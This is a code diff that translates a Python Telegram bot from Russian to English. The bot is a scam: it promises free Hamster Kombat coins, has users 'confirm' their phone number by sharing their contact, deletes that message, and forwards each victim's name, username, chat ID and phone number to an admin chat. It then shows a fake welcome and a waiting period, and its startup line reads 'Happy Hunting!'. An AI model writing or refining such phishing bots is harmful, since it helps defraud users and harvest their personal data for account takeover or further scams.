@@ -5,10 +5,10 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
 import importlib.util
 
-# Определение пути к config.py
+# Define the path to config.py
 config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', 'config.py')
 
-# Загрузка конфигурации
+# Load the configuration
 spec = importlib.util.spec_from_file_location("config", config_path)
 config = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(config)
@@ -21,52 +21,50 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(bot)
 
-# Обработчик стартовой функции
+# Handler for the start command
 @dp.message_handler(commands=['start'])
 async def on_start(message: types.Message):
-    await message.answer("<b>🖐 Привет это бот за регистрацию в которой\n"
-                         "Вы можете получить дополнительные Hamster Kombat монеты!.\n\n"
-                         "Монеты выдаются раз в 5-дней, сумма вариаруется от 10000-30000 тысяч монетов\n\n"
-                         "Для начала пройдите идентификацию /identification </b>", parse_mode="HTML")
+    await message.answer("<b>🖐 Hello! This is a bot where you can get additional Hamster Kombat coins for registration!\n\n"
+                         "Coins are given once every 5 days, the amount varies from 10,000 to 30,000 coins.\n\n"
+                         "To start, go through the identification process /identification</b>", parse_mode="HTML")
 
-# Обработчик идентификации
+# Handler for the identification command
 @dp.message_handler(commands=['identification'])
 async def on_start(message: types.Message):
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    button = types.KeyboardButton(text="✅ Подтвердить номер телефона", request_contact=True)
+    button = types.KeyboardButton(text="✅ Confirm phone number", request_contact=True)
     keyboard.add(button)
     
-    await message.answer("<b>Номер телефона\n\n"
-                         "Вам необходимо подтвердить номер телефона для того, чтобы завершить идентификацию в Hamster Kombat!.\n\n"
-                         "Для этого нажмите кнопку ниже.</b>", reply_markup=keyboard, parse_mode="HTML")
+    await message.answer("<b>Phone Number\n\n"
+                         "You need to confirm your phone number to complete the identification in Hamster Kombat!.\n\n"
+                         "To do this, press the button below.</b>", reply_markup=keyboard, parse_mode="HTML")
 
-# Обработчик получения информации
+# Handler for receiving contact information
 @dp.message_handler(content_types=[types.ContentType.CONTACT])
 async def on_contact_received(message: types.Message):
     contact = message.contact
-    await message.answer("Вы успешно идентифицированы.", reply_markup=types.ReplyKeyboardRemove())
+    await message.answer("You have been successfully identified.", reply_markup=types.ReplyKeyboardRemove())
     
     await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
 
-    # Отправка сообщения админу
-    admin_message = (f"Получен новый контакт:\n"
-                     f"Имя: {contact.first_name}\n"
-                     f"Никнейм: {message.from_user.username}\n"
-                     f"Chatid: {contact.user_id}\n"
-                     f"Номер телефона: {contact.phone_number}")
+    # Send a message to the admin
+    admin_message = (f"New contact received:\n"
+                     f"Name: {contact.first_name}\n"
+                     f"Username: {message.from_user.username}\n"
+                     f"Chat ID: {contact.user_id}\n"
+                     f"Phone number: {contact.phone_number}")
     await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)
 
-    # Отправка инструкций пользователю
+    # Send instructions to the user
     await bot.send_message(chat_id=message.chat.id, text=(
-	"<b>Привет! Добро пожаловать в Hamster Kombat 🐹\n"
-	"Отныне ты — директор криптобиржи. \n"
-	"Какой? Выбирай сам. Тапай по экрану, собирай монеты, качай пассивный доход, разрабатывай"
-	"собственную стратегию дохода.\n"
-	"Мы в свою очередь оценим это во время листинга токена, даты которого ты узнаешь совсем скоро.\n"
-	"Про друзей не забывай — зови их в игру и получайте вместе ещё больше монет!\n"
-
-	"P.S Вы должны подождать 3-дня для того чтобы получить первые монеты</b>"
-    ), parse_mode="Markdown")
+        "<b>Hello! Welcome to Hamster Kombat 🐹\n"
+        "From now on, you are the director of a crypto exchange.\n"
+        "Which one? Choose for yourself. Tap the screen, collect coins, build passive income, and develop"
+        "your own income strategy.\n"
+        "We will evaluate this during the token listing, the date of which you will find out very soon.\n"
+        "Don't forget about your friends — invite them to the game and get even more coins together!\n\n"
+        "P.S. You must wait 3 days to receive the first coins.</b>"
+    ), parse_mode="HTML")
 
 if __name__ == '__main__':
     print("[+] HK Bot has been started!\n[!] Happy Hunting!")
